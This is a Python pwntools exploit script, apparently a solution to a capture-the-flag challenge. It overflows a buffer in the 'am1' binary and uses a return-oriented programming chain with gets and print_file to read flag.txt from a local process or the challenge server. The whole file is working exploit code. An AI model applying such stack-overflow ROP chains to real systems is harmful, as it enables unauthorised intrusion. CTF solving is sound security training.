#!/usr/bin/python3

from pwn import *

exe = ELF('am1', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*print_file+1

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.battlectf.online', 1003)
else:
        p = process(exe.path)

GDB()
pop_rdi = 0x000000000040128b
payload = b""
payload = payload.ljust(56) + flat(
        pop_rdi, 0x0000000000404a00, exe.plt['gets'], exe.sym['main']
)
sla(b"you: \n", payload)
sl(b"flag.txt")
payload = b""
payload = payload.ljust(56) + flat(
        pop_rdi, 0x0000000000404a00,
        exe.sym['print_file']+1
)
sla(b"you: \n", payload)
p.interactive()
